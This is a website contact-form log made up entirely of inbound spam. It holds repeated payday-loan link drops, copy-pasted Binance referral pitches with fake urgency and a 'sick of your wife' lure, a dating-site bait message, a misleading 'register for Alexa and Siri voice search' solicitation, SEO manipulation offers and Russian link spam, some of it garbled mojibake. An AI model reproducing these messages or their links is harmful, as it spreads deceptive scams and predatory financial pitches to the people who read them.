+++ 2021-07-27 08:27:35 PM -- Email from: TerryRaf, -- subject: Мы поможем вам в лечении данных заболеваний, -- email: glukhin03@mail.ru, -- Message is: Мы поможем вам в лечении данных заболеваний 
Мы вынесли самые востребованные услуги на главную страницу, 
но у вас также есть возможность ознакомиться с полным перечнем предоставляемых услуг, нажав на кнопку &quot;Показать все&quot;. Надеемся, что вы достойно оцените качество нашего сервиса! 
&lt;a href=http://medsestra.site/tag/centr-po-profilaktike-i-lecheniyu-tabachnoy-i-nekhimicheskikh-zavisimostey/page/15/&gt;Лечение от алкоголизма казань клиника&lt;/a&gt;
&lt;a href=http://medsestra.site/tag/lechenie-ot-tabachnoy-zavisimosti-moskva/page/10/&gt;Можно ли после лечения алкоголизма&lt;/a&gt;
&lt;a href=http://medsestra.site/category/preparaty-lechenie-tabachnoy-zavisimosti-ot/page/161/&gt;табачная зависимость лечение&lt;/a&gt;
&lt;a href=http://medsestra.site/category/prakticheskoe-rukovodstvo-po-lecheniyu-tabachnoy-zavisimosti/page/163/&gt;препараты лечение табачной зависимости от&lt;/a&gt;
&lt;a href=http://medsestra.site/category/tabachnaya-zavisimost-lechenie/page/82/&gt;лечение от табачной зависимости москва&lt;/a&gt;
+++ 2021-07-28 12:10:19 AM -- Email from: Online Payday Loans, -- subject: njyoktzi, -- email: weezybe@qtmx.space, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;loans today&lt;/a&gt;
+++ 2021-07-28 02:19:44 AM -- Email from: Paydayloan, -- subject: pswwumuv, -- email: nglandstrom@qtmx.space, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;3000 loan&lt;/a&gt;
+++ 2021-07-28 04:09:15 AM -- Email from: Payday Loans, -- subject: jlzfzvpf, -- email: flvlxer@romail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;bad credit loans guaranteed&lt;/a&gt;
+++ 2021-07-28 04:32:56 AM -- Email from: Nataanymn, -- subject: Hello admin!, -- email: natalie@gmail.com, -- Message is: Didn't find other contacts went here - https://best-sex-here1.com/?u=41nkd08&amp;o=8dhpkzk 
Register and find me by nickname Nathalie! Now!
+++ 2021-07-28 04:33:39 AM -- Email from: Money Loan, -- subject: kgggxwxr, -- email: rosella@msmx.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;tax anticipation loan&lt;/a&gt;
+++ 2021-07-28 10:35:22 AM -- Email from: Anneliese Bolton, -- subject: Twitter and Amazon are adopting Bitcoin, -- email: bolton.anneliese@yahoo.com, -- Message is: Twitter is adopting Bitcoin -&gt; https://techcrunch.com/2021/07/23/daily-crunch-bitcoin-is-a-big-part-of-our-future-says-twitter-ceo-jack-dorsey/

Amazon is also jumping on the Bitcoin bandwagon - &gt;https://www.cnbc.com/2021/07/23/amazon-is-hiring-a-digital-currency-and-blockchain-expert.html

Do not miss this opportunity of the lifetime.

Many people buy bitcoin and other cryptocurrencies when prices are going up, this is the worst thing that you can do. In order to make money, you have to buy low (when others are not going euphoric) and sell high.

The chance to buy bitcoin is NOW.


Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-28 12:16:52 PM -- Email from: Payday Loans, -- subject: heuavjbe, -- email: alviemsmith@qtmx.space, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;online payday loan companies&lt;/a&gt;
+++ 2021-07-28 01:35:35 PM -- Email from: Amos Fereday, -- subject: , -- email: umonircio@joinm3.com, -- Message is: New method to advertise doesn't involve any costs at all:  https://bit.ly/no-more-ad-costs
+++ 2021-07-28 02:07:44 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-07-28 05:27:26 PM -- Email from: Paydayloan, -- subject: ypugdbel, -- email: kikomachia@jumbox.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;payday loans usa&lt;/a&gt;
+++ 2021-07-29 02:28:56 AM -- Email from: Payday Express, -- subject: wcmjrpeb, -- email: whoamitmia@msmx.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;poor credit loans&lt;/a&gt;
+++ 2021-07-29 03:50:04 AM -- Email from: Loans For Bad Credit, -- subject: jxyanfhf, -- email: johnfenoglio@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loans instant approval&lt;/a&gt;
+++ 2021-07-29 10:47:32 AM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-07-29 12:38:31 PM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://bestvideo2.xyz/video/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://bestvideo2.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-07-29 01:23:06 PM -- Email from: Payday, -- subject: kgcrsxli, -- email: queen2121@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;i need a loan now&lt;/a&gt;
+++ 2021-07-29 01:53:05 PM -- Email from: callmeDof, -- subject: call me, -- email: temptheatsecon1981@mail.ru, -- Message is: call me whatsapp: https://wa.me/79910404425
+++ 2021-07-29 08:48:29 PM -- Email from: Derekplure, -- subject: Download Music FTP, -- email: qriqua@tele2.nl, -- Message is: Hey, 
 
DOWNLOAD MUSIC, PRIVATE FTP ACCESS https://acidjazzrecords.blogspot.com/ 
Best regards, Derek
+++ 2021-07-30 02:56:54 AM -- Email from: Boyd Cerutty, -- subject: Twitter and Amazon are adopting Bitcoin, -- email: cerutty.boyd87@googlemail.com, -- Message is: Twitter is adopting Bitcoin -&gt; https://techcrunch.com/2021/07/23/daily-crunch-bitcoin-is-a-big-part-of-our-future-says-twitter-ceo-jack-dorsey/

Amazon is also jumping on the Bitcoin bandwagon - &gt;https://www.cnbc.com/2021/07/23/amazon-is-hiring-a-digital-currency-and-blockchain-expert.html

Do not miss this opportunity of the lifetime.

Many people buy bitcoin and other cryptocurrencies when prices are going up, this is the worst thing that you can do. In order to make money, you have to buy low (when others are not going euphoric) and sell high.

The chance to buy bitcoin is NOW.


Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-07-30 11:07:11 AM -- Email from: Payday Loans Online, -- subject: fvlxscea, -- email: lajaj671@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;payday loans las vegas nevada&lt;/a&gt;
+++ 2021-07-30 07:03:17 PM -- Email from: Mike Scott, -- subject: Increase sales for esyray.com, -- email: idahernandez3262@gmail.com, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Scott
 
support@monkeydigital.co
+++ 2021-07-30 10:30:27 PM -- Email from: Speedycash, -- subject: xxokysbv, -- email: bodachlyn@qtmx.space, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;home loans&lt;/a&gt;
+++ 2021-07-31 07:08:29 AM -- Email from: Payday Loan, -- subject: cfcirkip, -- email: marliesengelaar@instamail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;cash fast online&lt;/a&gt;
+++ 2021-07-31 07:17:15 AM -- Email from: Ivy Holmes, -- subject: Do you want more visits to your site?, -- email: holmes.ivy@gmail.com, -- Message is: Do you want more visits to your esyray.com ?
I succeeded and it works with this Fiverr gig   https://zeep.ly/RgLhL
+++ 2021-07-31 10:02:31 AM -- Email from: Mohamed Verdin, -- subject: A client recommended I get in touch., -- email: verdin.mohamed@gmail.com, -- Message is: Hi there!
I'll keep this short and sweet to make the 9 seconds it takes to read this worth your time (yes, I timed it),

My name is . I’m writing to you regarding the promotion of your website esyray.com

We are a team of Online Marketing and IT professionals from Deutschland.

Our services are sold by small packages and will be useful for small-medium companies interested in marketing their services in just 5 secs.

We’ve spoken with 1000s of business owners about what services they need and developed these: https://your-marketers.com

If this isn't a priority for you and your company right now, Here is a quick, 1-click unsubscribe link: https://your-marketers.com/?unsubscribe=esyray.com
+++ 2021-07-31 11:42:13 AM -- Email from: Payday, -- subject: gxnnaduj, -- email: zebrafish123@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;payday express&lt;/a&gt;
+++ 2021-07-31 05:16:28 PM -- Email from: Janette Gasiorowski, -- subject: Preston Scherz, -- email: oriannaisbat@virginiaintel.com, -- Message is: Best Free Traffic Sources : https://bit.ly/free-ads-here
+++ 2021-07-31 05:26:32 PM -- Email from: postingbigc, -- subject: Widespread online ads for growth of factors influencing consumer behaviour., -- email: pydinakatalja1990@rambler.ru, -- Message is: Dear Madame, Dear Sirs! 
 
 
Large-scale placement of ads on the web for organic growth of behavioural factors. 
https://xn----ftbeand5abdikisgee.xn--p1ai/home/ 
 
Factors influencing consumer behaviour are certain actions of users on the online resource, such as: 
logging in to the web page, viewing pages, time spent on the website, “clicks” on links, repeated returns to the website. 
 
UTO: 
Large-scale placement of your ads on the web in order to attract potential customers. 
Organic growth of factors influencing consumer behaviour occurs by the mass placement of your ads without specifying the address of your online resource, but with the indication of other identifying features according to which you presently become number one in the search results. These features can include a phone number, a unique name of the website or company, an identifier (product code, number, promotions, services), a physical address of the firm and etc. 
 
MAIN AIM: 
The mass attraction of potential customers to your online resource, products and services. 
Growth of behavioural factors. 
 
BENEFIT: 
An increase in online resource visitors who will find your website directly from ads using search engines as well as through additional results of a search itself related to a large range of search queries on your subject. 
 
ADVANTAGES OF THIS TYPE OF AD: 
1. Mass promotion. 
2. Placement speed. 
3. Cost. 
4. Placement by subject. 
5. Wide reach. 
6. Regionality. 
7. Growth of factors influencing consumer behaviour. 
 
REASONS TO ORDER LARGE-SCALE ADS PLACEMENT ONLINE ДЛЯ GROWTH OF FACTORS INFLUENCING CONSUMER BEHAVIOUR: 
 
1.Widespread attraction of customers to your services and products through direct access from ads. 
2.Organic promotion of your internet resource, due to search beginning to additionally show it for the largest range of search browser queries based on your subject. 
3. The absence of &quot;bans&quot; and &quot;filters&quot; of search, due to ads being placed without an indication of an url to the website. 
4. An increase in internet resource traffic, which leads to an increase in orders and an expansion of the customer base. 
5. &quot;Warm traffic&quot;, since only engaged users visit the online resource. 
6. Attraction of legal entities and individuals. 
7. Analysis of demand for services and goods. 
8.Placement of your ads in different countries all over the world. 
 
WHERE ADS ARE PLACED: 
 
Ads are placed:  on billboards, in guest books, in comments, in catalogues, on forums. 
Ads are placed on your: landing pages, phones, YouTube videos, websites, social media accounts, and on links to your other ads. 
 
SEARCH ENGINE SANCTIONS: 
In this type of ad a ban by search is not possible, since ads are published without specifying an link to the website. 
 
Working method: 
You send us the text of the ad, where your identifier or unique name is indicated at the end of the message, according to which an engaged user can easily find your website in search engine results in order to get further information about your product. 
To do this, a unique name or identifier must be published in the appropriate section of your internet resource и easily and quickly be found in search. 
 
 
Macros: 
Randomisation of ads is done according to the formula, which is accepted by many programs. As a result of randomisation, many unique ads are obtained from one ad variant. 
 
This is obtained as a result of manually synomising the ad text, while the meaning of the messages does not change and remains understandable. 
&lt;a href=https://xn----ftbeand5abdikisgee.xn--p1ai/home/&gt; 
 
Large-scale growth of behavioural factors.&lt;/a&gt;
+++ 2021-07-31 08:08:23 PM -- Email from: Pay Day Loan, -- subject: tgcndbtg, -- email: wilsoneqp@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;payday loans&lt;/a&gt;
+++ 2021-07-31 08:17:34 PM -- Email from: Payday Loans Online, -- subject: ttlrjmmp, -- email: kikomachia@romail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;personal loan interest rates&lt;/a&gt;
+++ 2021-07-31 10:24:59 PM -- Email from: Cash Loan, -- subject: pkoaoias, -- email: darryls@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;personal loan for bad credit&lt;/a&gt;
+++ 2021-08-01 01:48:32 AM -- Email from: Bad Credit, -- subject: luodnfes, -- email: diana59@instamail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;car loans for bad credit&lt;/a&gt;
+++ 2021-08-01 05:54:42 PM -- Email from: Speedycash, -- subject: jmwafwup, -- email: domtreseder@romail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loans direct lenders only&lt;/a&gt;
+++ 2021-08-02 12:42:08 AM -- Email from: Fallon Vigna, -- subject: Sick and Tired of your wife? Try this, -- email: fallon.vigna@msn.com, -- Message is: Some new comers in crypto-sphere in the last 2 years have made life-changing gains within a short period of time.

And many are reporting this to be a &quot;wife-changing experience&quot; as well.

While you may laugh at this, people really CAN change when crazy gains are made.

Are you sick of your marriage and feel stuck?

It is time to do something about it. Times are very difficult admist the pandemic and sometime we need to try something different. Cryptocurrency is the biggest techological revolution since the internet. Do not miss out on this!


PS: Even if you do NOT want to buy cryptocurrency, do you know that the world's biggest exchange Binance has a referral program? You can sign up at Binance here (https://bit.ly/33yXOqz) even if you are NOT going to trade. After 
signing up with Binance, you can share your referal links with your friends and make some passive income on the side. You get paid a small fee whenever your referrals buy or sell cryptocurrencies in Binance!

Covid19 has caused me to lose my job and I am doing what I can to make some money to put food on the table. If you have some spare change, please research cryptocurrencies and this is really a once in a lifetime opportunity to trade.

If you do not have any spare cash, you can still sign up for a free account and make money by promoting Binance to your friends! This is a great way to earn a little side income during this challenging times.

Act Now!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-08-02 03:46:57 AM -- Email from: Online Payday Loan, -- subject: igilfsfm, -- email: mitukilo@instamail.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;payday loans online lenders&lt;/a&gt;
+++ 2021-08-02 07:05:13 PM -- Email from: Online Loan, -- subject: gqvtxrze, -- email: rexabell@msmx.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;direct lender payday&lt;/a&gt;
+++ 2021-08-03 04:22:13 AM -- Email from: Online Payday Loans, -- subject: pdwtzqsy, -- email: kikomachia@jumbox.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;california payday loans&lt;/a&gt;
+++ 2021-08-03 05:58:44 AM -- Email from: Payday Loan Online, -- subject: isxhszhj, -- email: jeffcoleman1@msmx.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;short term loans no credit check&lt;/a&gt;
+++ 2021-08-03 01:54:28 PM -- Email from: Quick Loan, -- subject: rwligwxx, -- email: martinjoosten@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;loan lenders&lt;/a&gt;
+++ 2021-08-03 05:49:35 PM -- Email from: Best Payday Loan, -- subject: fojlmdla, -- email: amynewton@msmx.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;cash loans no credit check&lt;/a&gt;
+++ 2021-08-03 05:51:30 PM -- Email from: Personal Loans, -- subject: whspvabs, -- email: zzzorn@qtmx.space, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;easy online payday loans&lt;/a&gt;
+++ 2021-08-04 03:18:51 AM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-08-04 04:44:05 AM -- Email from: Bad Credit, -- subject: lvhwlmbw, -- email: mckenzie@msmx.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;money loans no credit check&lt;/a&gt;
+++ 2021-08-04 04:54:31 AM -- Email from: Payday Loan, -- subject: gajwzrzt, -- email: mjmooney@msmx.site, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;loan application&lt;/a&gt;
+++ 2021-08-04 08:19:10 AM -- Email from: Cash Advance, -- subject: ymzxcary, -- email: ken2583@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;quick credit&lt;/a&gt;
+++ 2021-08-04 12:44:14 PM -- Email from: Money Loan, -- subject: msabzomd, -- email: bits@qtmx.space, -- Message is: &lt;a href=&quot;http://sirilending.com/&quot;&gt;payday loans in colorado&lt;/a&gt;
+++ 2021-08-04 02:47:54 PM -- Email from: glunn, -- subject: раскрутка сайта продвижение, -- email: glukhina.1998@mail.ru, -- Message is: Заказать seo поисковую оптимизацию сайта, Заказать услуги по продвижению сайта По всем возникшим вопросам Вы можете обратиться в скайп логин &lt;b&gt;pokras7777&lt;/b&gt;Раскрутка сайта под ключ 
.Так же собираем базы  Обратесь всегда будем рады вам помочь наша группа в телеграме &lt;a href=https://goo.su/4zRx&gt;бесплатные базы для хрумера&lt;/a&gt; или в пишите 
&lt;a href=http://surl.li/vzoi&gt;скайп&lt;/a&gt; 
 
 
 
&lt;a href=http://medkilnika.site/category/sposoby-lecheniya-tabachnoy-zavisimosti/page/225/&gt;Р»РµС‡РµРЅРёРµ РѕС‚ С‚Р°Р±Р°С‡РЅРѕР№ Р·Р°РІРёСЃРёРјРѕСЃС‚Рё РјРѕСЃРєРІР°&lt;/a&gt;
&lt;a href=http://medkilnika.site/platnye-kliniki-po-lecheniyu-alkogolizma/&gt;РєР»РёРЅРёРєР° РїРѕ Р»РµС‡РµРЅРёСЋ С‚Р°Р±Р°С‡РЅРѕР№ Р·Р°РІРёСЃРёРјРѕСЃС‚Рё&lt;/a&gt;
&lt;a href=http://medkilnika.site/category/lechenie-tabachnoy-zavisimosti-v-yaroslavle/page/106/&gt;Р»РµС‡РµРЅРёРµ С‚Р°Р±Р°С‡РЅРѕР№ Р·Р°РІРёСЃРёРјРѕСЃС‚Рё СЏСЂРѕСЃР»Р°РІР»СЊ&lt;/a&gt;
&lt;a href=http://medsestra.site/tag/lechenie-tabachnoy-zavisimosti-minsk/page/38/&gt;Р»РµС‡РµРЅРёРµ РѕС‚ С‚Р°Р±Р°С‡РЅРѕР№ Р·Р°РІРёСЃРёРјРѕСЃС‚Рё РјРѕСЃРєРІР°&lt;/a&gt;
&lt;a href=http://medkilnika.site/category/lechenie-tabachnoy-zavisimosti-v-yaroslavle/page/53/&gt;Р¦РµРЅС‚СЂ Р»РµС‡РµРЅРёСЏ РЅР°СЂРєРѕРјР°РЅРёРё РІ Р±РµР»РіРѕСЂРѕРґРµ&lt;/a&gt;
+++ 2021-08-04 02:52:39 PM -- Email from: Direct Lenders, -- subject: uxjgecdo, -- email: draramosnardy@romail.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;cash advance direct&lt;/a&gt;
+++ 2021-08-04 03:00:33 PM -- Email from: Payday Loan, -- subject: psmqudvc, -- email: menfordkinder25778@msmx.site, -- Message is: &lt;a href=&quot;https://sirilending.com/&quot;&gt;easy loans&lt;/a&gt;
+++ 2021-08-05 05:51:21 AM -- Email from: Wally Allcot, -- subject: Sick and Tired of your wife? Try this, -- email: allcot.wally@outlook.com, -- Message is: Some new comers in crypto-sphere in the last 2 years have made life-changing gains within a short period of time.

And many are reporting this to be a &quot;wife-changing experience&quot; as well.

While you may laugh at this, people really CAN change when crazy gains are made.

Are you sick of your marriage and feel stuck?

It is time to do something about it. Times are very difficult admist the pandemic and sometime we need to try something different. Cryptocurrency is the biggest techological revolution since the internet. Do not miss out on this!


PS: Even if you do NOT want to buy cryptocurrency, do you know that the world's biggest exchange Binance has a referral program? You can sign up at Binance here (https://bit.ly/33yXOqz) even if you are NOT going to trade. After 
signing up with Binance, you can share your referal links with your friends and make some passive income on the side. You get paid a small fee whenever your referrals buy or sell cryptocurrencies in Binance!

Covid19 has caused me to lose my job and I am doing what I can to make some money to put food on the table. If you have some spare change, please research cryptocurrencies and this is really a once in a lifetime opportunity to trade.

If you do not have any spare cash, you can still sign up for a free account and make money by promoting Binance to your friends! This is a great way to earn a little side income during this challenging times.

Act Now!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-08-05 02:53:33 PM -- Email from: Justin Lackey, -- subject: , -- email: justin.lackey82@gmail.com, -- Message is: Why pay for ads when you can get them free? Here are 50 proven ways to get effective advertising for your site : https://bit.ly/how-to-get-free-advertising
+++ 2021-08-06 01:09:17 PM -- Email from: Yanira Latour, -- subject: Sick and Tired of your wife? Try this, -- email: yanira.latour@googlemail.com, -- Message is: Some new comers in crypto-sphere in the last 2 years have made life-changing gains within a short period of time.

And many are reporting this to be a &quot;wife-changing experience&quot; as well.

While you may laugh at this, people really CAN change when crazy gains are made.

Are you sick of your marriage and feel stuck?

It is time to do something about it. Times are very difficult admist the pandemic and sometime we need to try something different. Cryptocurrency is the biggest techological revolution since the internet. Do not miss out on this!


PS: Even if you do NOT want to buy cryptocurrency, do you know that the world's biggest exchange Binance has a referral program? You can sign up at Binance here (https://bit.ly/33yXOqz) even if you are NOT going to trade. After 
signing up with Binance, you can share your referal links with your friends and make some passive income on the side. You get paid a small fee whenever your referrals buy or sell cryptocurrencies in Binance!

Covid19 has caused me to lose my job and I am doing what I can to make some money to put food on the table. If you have some spare change, please research cryptocurrencies and this is really a once in a lifetime opportunity to trade.

If you do not have any spare cash, you can still sign up for a free account and make money by promoting Binance to your friends! This is a great way to earn a little side income during this challenging times.

Act Now!

Don't have enough money to buy a whole Bitcoin? No worries, anyone can buy a fraction of Bitcoin. For example, if you have $350, you can buy 1/00 (1%) of a Bitcoin!

To get started, you can buy your first Bitcoin (or a small fraction of it) below:

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here -&gt; https://bit.ly/33yXOqz (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-08-07 01:14:23 AM -- Email from: Malcolm Friend, -- subject: It’s hard to find products and services that esyray.com won’t sell online., -- email: friend.malcolm@msn.com, -- Message is: German quality marketing services.

Hey there, 

Online Marketing is essential for local businesses. They not only enhance your online presence and improve your local visibility, but they also help build brand awareness and allow your business to be discovered more easily.

The simplest way to promote your company. Just enter your website URL, and we will do all the work.

Business owners use this enormous  service to win superb customers regularly:

https://first-class-promo.com



Warm regards,
We offer the top marketing services you may check on our shop to make big money in a small business, still not thinking about getting new business? Here is a quick, 1-click unsubscribe link: https://first-class-promo.com/?unsubscribe=esyray.com
+++ 2021-08-07 08:50:21 AM -- Email from: Bart Ballou, -- subject: US/UK content writers are waiting for you, -- email: info@getcontent.rocks, -- Message is: Hello

We offer content writing and syndication.

Starting at only $2 per 100 words.

Check us out at http://GetContent.rocks

Order original content now. 



Best Regards!

Bart Ballou






No more emails but if you wish you can remove your site at http://unsubscribe.getcontent.rocks
+++ 2021-08-08 01:29:03 AM -- Email from: Mike Gerald, -- subject: Local SEO for more business, -- email: christinefloyd7162@gmail.com, -- Message is: Hi 
 
We will increase your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our plans here, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike Gerald
 
Speed SEO Digital Agency
+++ 2021-08-09 12:50:19 PM -- Email from: Todd Button, -- subject: Sick and Tired of your wife? Try this, -- email: todd.button72@msn.com, -- Message is: Some new comers in crypto-sphere in the last 2 years have made life-changing gains within a short period of time.

And many are reporting this to be a &quot;wife-changing experience&quot; as well.

While you may laugh at this, people really CAN change when crazy gains are made.

Are you sick of your marriage and feel stuck?

It is time to do something about it. Times are very difficult admist the pandemic and sometime we need to try something different. Cryptocurrency is the biggest techological revolution since the internet. Do not miss out on this!


PS: Even if you do NOT want to buy cryptocurrency, do you know that the world's biggest exchange Binance has a referral program? You can sign up at Binance here (https://bit.ly/33yXOqz) even if you are NOT going to trade. After 
signing up with Binance, you can share your referal links with your friends and make some passive income on the side. You get paid a small fee whenever your referrals buy or sell cryptocurrencies in Binance!

